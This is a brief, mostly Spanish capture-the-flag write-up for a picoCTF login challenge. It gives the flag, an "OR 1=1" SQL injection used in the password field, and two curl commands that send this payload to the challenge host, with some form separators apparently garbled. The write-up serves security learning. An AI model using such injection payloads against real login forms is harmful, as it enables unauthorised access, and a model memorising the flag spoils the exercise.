## **Descripcion**
Do you think you can log us in? Try to see if you can login!http://fickle-tempest.picoctf.net:49263.
## **Solucion**
se hizo uso del inspector  y consola
picoCTF{s0m3_SQL_85832275}
## **Notas adicionales**
Aqui se estuvo como referencia investigar que es un SQL Injection
despues de eso en el inspector se modifico el codigo en la parte de values=0 se hizo a uno, en eso volvimos al login ingresamos usuario y en contraseña este OR 1=1,asi nos dio la bandera

En caso de consola es lo mismo,pero con comandos.
curl -s http://fickle-tempest.picoctf.net:49263  -d "username=admin6password=password6debug=1"
curl -s http://fickle-tempest.picoctf.net:49263  -d "username=admin6password='or 1 =1;6debug=1"
## **Referencias**
- SQL Injection: [https://www.w3schools.com/sql/sql_injection.asp](https://www.w3schools.com/sql/sql_injection.asp "https://www.w3schools.com/sql/sql_injection.asp")
	- picoCTF 2019 writeup [7] - Web - Irish-Name-Repo 1 https://www.youtube.com/watch?v=0EDbUSDqrng&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=8